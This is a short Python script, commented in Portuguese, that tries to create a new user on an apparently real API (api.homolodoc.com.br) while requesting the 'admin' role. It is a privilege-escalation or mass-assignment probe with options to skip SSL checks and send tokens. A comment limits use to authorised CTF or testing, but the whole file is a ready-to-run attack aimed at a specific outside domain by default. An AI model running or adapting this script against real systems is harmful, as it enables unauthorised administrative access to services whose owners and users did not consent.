#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import argparse
import requests
from requests.exceptions import RequestException

# AVISO: use apenas em ambientes autorizados (CTF / teste autorizado).

def main():
    p = argparse.ArgumentParser(description="Tenta criar usuário via API")
    p.add_argument("--url", default="https://api.homolodoc.com.br/User/create",
                   help="Endpoint de criação de usuário")
    p.add_argument("--name", default="PentestUser")
    p.add_argument("--email", default="pentest@test.com")
    p.add_argument("--password", default="Test123!")
    p.add_argument("--cpf", default="12345678901")
    p.add_argument("--role", default="admin", help="Papel a solicitar (ex: user/admin)")
    p.add_argument("--timeout", type=int, default=12)
    p.add_argument("--insecure", action="store_true",
                   help="Ignora verificação SSL (verify=False)")
    p.add_argument("--bearer", default=os.getenv("API_BEARER"),
                   help="Token Bearer (Authorization: Bearer <token>)")
    p.add_argument("--apikey", default=os.getenv("API_KEY"),
                   help="API key (x-api-key)")
    args = p.parse_args()

    # Desabilita warnings SSL se --insecure
    if args.insecure:
        try:
            import urllib3
            from urllib3.exceptions import InsecureRequestWarning
            urllib3.disable_warnings(InsecureRequestWarning)
        except Exception:
            pass

    payload = {
        "name": args.name,
        "email": args.email,
        "password": args.password,
        "cpf": args.cpf,
        "role": args.role,   # tentativa de privilégio elevado (pode ser ignorado pelo backend)
    }

    headers = {
        "User-Agent": "CTF-UserCreator/1.0",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
    }
    if args.bearer:
        headers["Authorization"] = f"Bearer {args.bearer}"
    if args.apikey:
        headers["x-api-key"] = args.apikey

    try:
        resp = requests.post(
            args.url,
            json=payload,
            headers=headers,
            timeout=args.timeout,
            verify=not args.insecure
        )
    except RequestException as e:
        print(f"[ERRO] Falha na requisição: {e}")
        return

    # Tenta imprimir JSON de forma bonita; senão, corpo bruto
    try:
        body = resp.json()
        body_str = json.dumps(body, ensure_ascii=False, indent=2)[:2000]
    except ValueError:
        body_str = (resp.text or "")[:2000]

    print(f"Status: {resp.status_code}")
    # Alguns backends retornam 201 (Created) ou 200
    if resp.status_code in (200, 201):
        print("[OK] Requisição aparentemente bem-sucedida.")
    elif resp.status_code in (400, 401, 403, 409):
        print("[INFO] Rejeitado/Conflito/Não autorizado (comum em criação sem permissões).")
    else:
        print("[INFO] Resultado não previsto — confira a resposta.")

    print("Resposta:")
    print(body_str)

if __name__ == "__main__":
    main()
